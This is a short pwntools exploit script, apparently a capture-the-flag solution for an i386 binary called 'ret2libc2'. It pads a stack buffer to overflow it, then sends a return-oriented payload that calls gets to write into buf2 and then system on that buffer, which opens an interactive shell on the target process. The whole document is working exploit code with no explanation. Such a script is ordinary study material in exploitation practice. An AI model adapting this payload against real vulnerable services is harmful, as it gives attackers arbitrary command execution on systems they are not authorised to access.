from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2libc2'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8

gets_addr = 0x08048460
buf2_addr = 0x0804A080
system_addr = 0x8048490
pop_ebx_ret = rop.search(8).address

payload = flat([cyclic(padding), gets_addr, pop_ebx_ret, buf2_addr, system_addr, 0xdeadbeaf, buf2_addr])
delimiter = "\n"
io.sendlineafter(delimiter, payload)
io.interactive()
